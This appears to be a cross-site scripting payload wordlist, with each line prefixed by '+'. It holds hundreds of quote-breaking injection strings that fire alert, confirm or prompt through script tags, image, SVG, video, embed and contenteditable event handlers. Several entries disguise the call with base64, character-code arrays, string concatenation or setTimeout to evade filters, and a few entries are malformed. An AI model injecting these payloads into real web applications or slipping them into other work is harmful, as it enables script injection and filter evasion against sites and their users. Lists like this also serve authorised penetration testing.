+"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
+"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
+"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
+'><script>alert()</script>
+'><script>confirm()</script>
+'><script>prompt()</script>
+'><script>alert(0)</script>
+'><script>confirm(0)</script>
+'><script>prompt(0)</script>
+'><script>alert('')</script>
+'><script>alert('');</script>
+'><script>confirm('')</script>
+'><script>prompt('')</script>
+'><script>"alert('texto')"</script>
+'><script>"confirm('texto')"</script>
+'><script>"confirm('texto');"</script>
+'><script>"prompt('texto')"</script>
+'><img src=img.png onerror=alert()>
+'><img src=img.png onerror=confirm()>
+'><img src=img.png onerror=prompt()>
+'><img src=img.png onerror=alert(0)>
+'><img src=img.png onerror=confirm(0)>
+'><img src=img.png onerror=prompt(0)>
+'><img src=img.png onerror=alert('')>
+'><img src=img.png onerror=confirm('')>
+'><img src=img.png onerror=prompt('')>
+'><img src=img.png onerror="alert('texto')">
+'><img src=img.png onerror="confirm('texto')">
+'><img src=img.png onerror="prompt('texto')">
+'><img src=img.png tabindex='0' onfocus=alert()>
+'><img src=img.png tabindex='0' onfocus=confirm()>
+'><img src=img.png tabindex='0' onfocus=prompt()>
+'><img src=img.png tabindex='0' onfocus=alert(0)>
+'><img src=img.png tabindex='0' onfocus=confirm(0)>
+'><img src=img.png tabindex='0' onfocus=prompt(0)>
+'><img src=img.png tabindex='0' onfocus=alert(//)>
+'><img src=img.png tabindex='0' onfocus=confirm(//)>
+'><img src=img.png tabindex='0' onfocus=prompt(//)>
+'><img src=img.png tabindex='0' onfocus=prompt(//);>
+'><img src=img.png tabindex='0' onblur=alert()>
+'><img src=img.png tabindex='0' onblur=confirm()>
+'><img src=img.png tabindex='0' onblur=prompt()>
+'><img src=img.png tabindex='0' onblur=alert(0)>
+'><img src=img.png tabindex='0' onblur=confirm(0)>
+'><img src=img.png tabindex='0' onblur=prompt(0)>
+'><img src=img.png tabindex='0' onblur=alert(//)>
+'><img src=img.png tabindex='0' onblur=confirm(//)>
+'><img src=img.png tabindex='0' onblur=prompt(//)>
+'><video src="video.mp4" onloadstart=alert()></video>
+'><video/src='video.mov'/controls/onerror=confirm()></video>
+'><svg/onload=confirm()>
+'><svg/////////////onload ='confirm()'//////>
+'><input/oncut=confirm()>
+'><div contenteditable="true" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable="true"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable='true' oncut=confirm();>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable='true'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable="false" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable="false"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable='false' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable="true" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable="true"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable='true'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable="false" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable="false"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable='false' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable='false' oncopy=confirm();>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable='false'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable="true" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable="true"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable='true'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable="false" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable="false"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable='false' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable='false'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable="true" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable="true"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable='true'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable="false" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable="false"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><div/contenteditable='false'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'><span contenteditable="true" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable="true"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable="true"/oncut=confirm();>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='true'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable="false" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable="false"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable='false' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='false'/oncut=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable="true" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable="true"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='true'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable="false" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable="false"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable='false' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='false'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='false'/oncopy=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable="true" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable="true"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='true'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable="false" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable="false"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable='false' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='false'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='false'/onpaste=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable="true" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable="true"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='true'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable="false" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable="false"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='false'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'><span/contenteditable='false'/onclick=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'><p contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'><p contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'><p contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'><p contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'><p contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'><p contenteditable='true' oncopy=confirm();>D41D8CD98F00B204E9800998ECF8427E</p>
+'><p contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'><p contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'><p contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'><p contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'><embed src="example.pdf" type="application/pdf" onload=confirm()>
+'>< script>prompt(/'1/')</script >
+'><svg/onload​=import()
+'><svg onload="eval(atob('Y29uZmlybSgp'))"></svg>
+'><svg onload="eval(String.fromCharCode(99,111,110,102,105,114,109,40,41))"></svg>
+'><svg onload="(() => { eval('co' + 'nfi' + 'rm()'); })()"></svg>
+'><svg onload="this['co' + 'nfi' + 'rm']()"></svg>
+'><svg onload="setTimeout('confirm()', 0)"></svg>
+'><svg onactivate="import('Activated!')" width="100" height="100"></svg>
+'><img src="example.png" onload="eval(atob('YWxlcnQoJ0hhY2tlYWRvJyk='))">
+'><svg width="100" height="100" onmouseover="eval(atob('Y29uZmlybSgnTWFuZWphJyk='))"></svg>
+'><img src="example.png" onload="eval(atob('YWxlcnQoJ0hhY2tlYWRvJyk='))">
+'><svg width="100" height="100" onmouseover="eval(atob('Y29uZmlybSgnTWFuZWphJyk='))"></svg>
+'><img src="example.png" onload="eval(String.fromCharCode(97,108,101,114,116,40,39,79,75,39,41))">
+'><svg width="100" height="100" onmouseover="eval(String.fromCharCode(99,111,110,102,105,114,109,40,39,72,101,108,108,111,39,41))"></svg>
+'><img src="example.png" onload="eval('ale' + 'rt' + '(' + '\'OK\'' + ')')">
+'><svg width="100" height="100" onmouseover="eval('con' + 'firm' + '(' + '\'¿Seguro?\'' + ')')"></svg>
+'><img src="example.png" onload="(function(x){eval(x)})('alert(\\'OK\\')')">
+'><svg width="100" height="100" onmouseover="(function(x){eval(x)})('confirm(\\'¿Seguro?\\')')"></svg>
+'><svg width="100" height="100" onmouseover="window['confirm']('¿Listo?')"></svg>
+'><img src="example.png" onload="let f={'a':'alert','c':'confirm'};window[f['a']]('OK')">
+'><svg width="100" height="100" onmouseover="let f={'a':'alert','c':'confirm'};window[f['c']]('¿Seguro?')"></svg>
+'><img src="example.png" onload="(()=>{eval('alert(\\'OK\\')')})()">
+'><svg width="100" height="100" onmouseover="(()=>{eval('confirm(\\'¿Seguro?\\')')})()"></svg>
+'><img src="example.png" onload="setTimeout('alert(\\'OK\\')', 100)">
+'><svg width="100" height="100" onmouseover="setTimeout('confirm(\\'¿Seguro?\\')', 100)">
+'><img src="example.png" onload="eval(atob('ZW' + 'xh' + 'cnQoJ09LJyk='))">
+'><svg width="100" height="100" onmouseover="eval(String.fromCharCode(...[99,111,110,102,105,114,109,40,39,79,75,39,41]))"></svg>
+'><object data="example.pdf" type="application/pdf" onload="alert('El objeto se cargó')"></object>
+'><embed src="example.pdf" type="application/pdf" onload="confirm('¿Cargar contenido?')">
+'><video controls><source src="video.mp4" type="video/mp4"><track src="subtitles.vtt" kind="subtitles" label="Español" onload="alert('Subtítulos cargados')"6></video>
+"><script>alert()</script>
+"><script>confirm()</script>
+"><script>prompt()</script>
+"><script>alert(0)</script>
+"><script>confirm(0)</script>
+"><script>prompt(0)</script>
+"><script>alert('')</script>
+"><script>confirm('')</script>
+"><script>prompt('')</script>
+"><script>prompt('');</script>
+"><script>"alert('texto')"</script>
+"><script>"confirm('texto')"</script>
+"><script>"prompt('texto')"</script>
+"><img src=img.png onerror=alert()>
+"><img src=img.png onerror=confirm()>
+"><img src=img.png onerror=prompt()>
+"><img src=img.png onerror=alert(0)>
+"><img src=img.png onerror=confirm(0)>
+"><img src=img.png onerror=prompt(0)>
+"><img src=img.png onerror=alert('')>
+"><img src=img.png onerror=confirm('')>
+"><img src=img.png onerror=prompt('')>
+"><img src=img.png onerror="alert('texto')">
+"><img src=img.png onerror="confirm('texto')">
+"><img src=img.png onerror="prompt('texto')">
+"><img src=img.png tabindex='0' onfocus=alert()>
+"><img src=img.png tabindex='0' onfocus=confirm()>
+"><img src=img.png tabindex='0' onfocus=prompt()>
+"><img src=img.png tabindex='0' onfocus=alert(0)>
+"><img src=img.png tabindex='0' onfocus=confirm(0)>
+"><img src=img.png tabindex='0' onfocus=prompt(0)>
+"><img src=img.png tabindex='0' onfocus=alert(//)>
+"><img src=img.png tabindex='0' onfocus=confirm(//)>
+"><img src=img.png tabindex='0' onfocus=confirm(//);>
+"><img src=img.png tabindex='0' onfocus=prompt(//)>
+"><img src=img.png tabindex='0' onblur=alert()>
+"><img src=img.png tabindex='0' onblur=confirm()>
+"><img src=img.png tabindex='0' onblur=prompt()>
+"><img src=img.png tabindex='0' onblur=alert(0)>
+"><img src=img.png tabindex='0' onblur=confirm(0)>
+"><img src=img.png tabindex='0' onblur=prompt(0)>
+"><img src=img.png tabindex='0' onblur=alert(//)>
+"><img src=img.png tabindex='0' onblur=confirm(//)>
+"><img src=img.png tabindex='0' onblur=prompt(//)>
+"><video src="video.mp4" onloadstart=alert()></video>
+"><video/src='video.mov'/controls/onerror=confirm()></video>
+"><svg/onload=confirm()>
+"><svg/////////////onload ='confirm()'//////>
+"><input/oncut=confirm()>
+"><div contenteditable="true" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable="true"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable='true'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable="false" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable="false"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable='false' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable="true" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable="true" oncopy=confirm();>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable="true"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable='true'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable="false" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable="false"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable='false' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable='false'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable="true" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable="true"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable='true'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable="false" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable="false"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable='false' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable='false'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable="true" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable="true"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable='true'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable="false" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable="false"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><div/contenteditable='false'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+"><span contenteditable="true" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable="true"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='true'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable="false" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable="false"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable='false' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='false'/oncut=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable="true" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable="true"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable="true"/oncopy=confirm();>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='true'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable="false" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable="false"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable='false' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='false'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='false'/oncopy=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable="true" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable="true"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='true'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable="false" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable="false"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable='false' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='false'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='false'/onpaste=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable="true" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable="true"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable="true"/onclick=confirm();>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='true'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable="false" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable="false"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='false'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+"><span/contenteditable='false'/onclick=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+"><p contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+"><p contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+"><p contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+"><p contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+"><p contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+"><p contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+"><p contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+"><p contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+"><p contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+"><embed src="example.pdf" type="application/pdf" onload=confirm()>
+">< script>prompt(/'1/')</script >
+"><svg/onload​=import()
+"><svg onload="eval(atob('Y29uZmlybSgp'))"></svg>
+"><svg onload="eval(String.fromCharCode(99,111,110,102,105,114,109,40,41))"></svg>
+"><svg onload="(() => { eval('co' + 'nfi' + 'rm()'); })()"></svg>
+"><svg onload="this['co' + 'nfi' + 'rm']()"></svg>
+"><svg onload="setTimeout('confirm()', 0)"></svg>
+"><svg onactivate="import('Activated!')" width="100" height="100"></svg>
+"><img src="example.png" onload="eval(atob('YWxlcnQoJ0hhY2tlYWRvJyk='))">
+"><svg width="100" height="100" onmouseover="eval(atob('Y29uZmlybSgnTWFuZWphJyk='))"></svg>
+"><img src="example.png" onload="eval(atob('YWxlcnQoJ0hhY2tlYWRvJyk='))">
+"><svg width="100" height="100" onmouseover="eval(atob('Y29uZmlybSgnTWFuZWphJyk='))"></svg>
+"><img src="example.png" onload="eval(String.fromCharCode(97,108,101,114,116,40,39,79,75,39,41))">
+"><svg width="100" height="100" onmouseover="eval(String.fromCharCode(99,111,110,102,105,114,109,40,39,72,101,108,108,111,39,41))"></svg>
+"><img src="example.png" onload="eval('ale' + 'rt' + '(' + '\'OK\'' + ')')">
+"><svg width="100" height="100" onmouseover="eval('con' + 'firm' + '(' + '\'¿Seguro?\'' + ')')"></svg>
+"><img src="example.png" onload="(function(x){eval(x)})('alert(\\'OK\\')')">
+"><svg width="100" height="100" onmouseover="(function(x){eval(x)})('confirm(\\'¿Seguro?\\')')"></svg>
+"><svg width="100" height="100" onmouseover="window['confirm']('¿Listo?')"></svg>
+"><img src="example.png" onload="let f={'a':'alert','c':'confirm'};window[f['a']]('OK')">
+"><svg width="100" height="100" onmouseover="let f={'a':'alert','c':'confirm'};window[f['c']]('¿Seguro?')"></svg>
+"><img src="example.png" onload="(()=>{eval('alert(\\'OK\\')')})()">
+"><svg width="100" height="100" onmouseover="(()=>{eval('confirm(\\'¿Seguro?\\')')})()"></svg>
+"><img src="example.png" onload="setTimeout('alert(\\'OK\\')', 100)">
+"><svg width="100" height="100" onmouseover="setTimeout('confirm(\\'¿Seguro?\\')', 100)">
+"><img src="example.png" onload="eval(atob('ZW' + 'xh' + 'cnQoJ09LJyk='))">
+"><svg width="100" height="100" onmouseover="eval(String.fromCharCode(...[99,111,110,102,105,114,109,40,39,79,75,39,41]))"></svg>
+"><object data="example.pdf" type="application/pdf" onload="alert('El objeto se cargó')"></object>
+"><embed src="example.pdf" type="application/pdf" onload="confirm('¿Cargar contenido?')">
+"><video controls><source src="video.mp4" type="video/mp4"><track src="subtitles.vtt" kind="subtitles" label="Español" onload="alert('Subtítulos cargados')"6></video>
+'<script>alert()</script>
+'<script>confirm()</script>
+'<script>prompt()</script>
+'<script>alert(0)</script>
+'<script>confirm(0)</script>
+'<script>prompt(0)</script>
+'<script>alert('')</script>
+'<script>confirm('')</script>
+'<script>prompt('')</script>
+'<script>"alert('texto')"</script>
+'<script>"confirm('texto')"</script>
+'<script>"prompt('texto')"</script>
+'<img src=img.png onerror=alert()>
+'<img src=img.png onerror=confirm()>
+'<img src=img.png onerror=prompt()>
+'<img src=img.png onerror=alert(0)>
+'<img src=img.png onerror=confirm(0)>
+'<img src=img.png onerror=prompt(0)>
+'<img src=img.png onerror=prompt(0);>
+'<img src=img.png onerror=alert('')>
+'<img src=img.png onerror=confirm('')>
+'<img src=img.png onerror=prompt('')>
+'<img src=img.png onerror="alert('texto')">
+'<img src=img.png onerror="confirm('texto')">
+'<img src=img.png onerror="prompt('texto')">
+'<img src=img.png tabindex='0' onfocus=alert()>
+'<img src=img.png tabindex='0' onfocus=confirm()>
+'<img src=img.png tabindex='0' onfocus=prompt()>
+'<img src=img.png tabindex='0' onfocus=alert(0)>
+'<img src=img.png tabindex='0' onfocus=confirm(0)>
+'<img src=img.png tabindex='0' onfocus=prompt(0)>
